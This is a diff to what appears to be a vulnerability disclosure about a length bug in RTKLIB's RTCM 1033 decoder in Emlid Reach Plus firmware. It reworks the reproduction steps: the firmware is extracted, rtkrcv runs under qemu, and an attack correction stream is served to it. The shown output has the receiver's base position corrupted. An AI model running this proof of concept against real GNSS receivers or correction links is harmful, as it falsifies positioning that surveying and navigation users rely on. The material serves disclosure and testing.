@@ -561,7 +561,7 @@ gap than "static analysis," since the actual compiled instructions from the
 actual shipped binary are what executed, but a gap worth naming rather than
 rounding to zero.
 
-Reproduce:
+Reproduce, static side:
 
 ```sh
 curl -O https://files.emlid.com/images/reach-plus-v2.18.1.zip
@@ -571,21 +571,19 @@ debugfs -R "dump /usr/lib/librtk.so ./librtk.so" rootfs.img
 ./check_binary.sh ./librtk.so                      # 1033 decoder present? fortified?
 debugfs -R "dump /usr/bin/RTKLIB/app/rtkrcv/gcc/rtkrcv ./rtkrcv" rootfs.img
 readelf -d ./rtkrcv | grep NEEDED                  # confirms rtkrcv actually loads librtk.so
+```
 
-# dynamic run, no root:
+Reproduce, dynamic side — `reach_qemu_demo.sh` is the whole thing above as
+one command, rehearsed and reliable across repeated runs (script-quality,
+same bar as everything else in this Files table, not a one-off):
+
+```sh
 apt-get download qemu-user-static && dpkg-deb -x qemu-user-static*.deb ./qemu
-python3 gen_rtcm.py benign.bin --benign
-python3 gen_rtcm.py attack.bin --len 211
-# serve benign.bin then attack.bin on 127.0.0.1:9000 (a ~15-line TCP server:
-# accept, send benign.bin on a loop for a few seconds, then attack.bin)
-cd rootfs/usr/bin/RTKLIB/app/rtkrcv/gcc
-../../../../../../../qemu/usr/bin/qemu-aarch64-static -L ../../../../../../../rootfs \
-    ./rtkrcv -s -p 9001 -t 5 -o ../rtk.conf &
-python3 -c "
-import socket,time
-s=socket.create_connection(('127.0.0.1',9001)); s.settimeout(2)
-s.sendall(b'admin\r\nstatus\r\n'); time.sleep(1)
-print(s.recv(65536).decode(errors='replace'))"
+debugfs -R "rdump / ./extracted" rootfs.img         # full filesystem, not just one file this time
+
+ROOTFS=./extracted QEMU=./qemu/usr/bin/qemu-aarch64-static ./reach_qemu_demo.sh
+#   before the attack: pos xyz (m) base : -2694685.473,-4293642.366,3857878.924
+#   after the attack:  pos xyz (m) base : -2694684.000,-4293642.366,3857878.924
 ```
 
 The extracted image and filesystem (~2.5 GB) are not checked in; this section
@@ -1460,6 +1458,9 @@ with a different toolchain (gcc/glibc vs. Apple clang).
 | `check_offsets.py` | does the payload length transfer to other architectures — `sta_t` layout across six ABIs, by cross-compilation, with nothing run on the target |
 | `check_binary.sh` | which column a shipped binary falls into: `*_chk` imports, and whether the 1033 decoder is actually in the binary being tested |
 | `check_image.sh` | look inside a firmware/OS image for RTKLIB without root — `dd` + `debugfs`, no mounting |
+| `reach_qemu_demo.sh` | runs Reach Plus's actual `rtkrcv` under `qemu-aarch64-static` against a real correction stream and reads the corrupted base position back through its own console — the whole "Dynamic confirmation" section above, as one repeatable command |
+| `rtcm_stream_server.py` | the correction-link stand-in `reach_qemu_demo.sh` uses: plays clean traffic, pauses, then the attack stream, on a local TCP port |
+| `rtkrcv_console.py` | minimal client for rtkrcv's own telnet console — login, send commands, print responses |
 | `pick_base.py` | what each `n1` rung does to a given base coordinate, and where to site a demo base so the reliable rung is also a visible one |
 
 ```sh
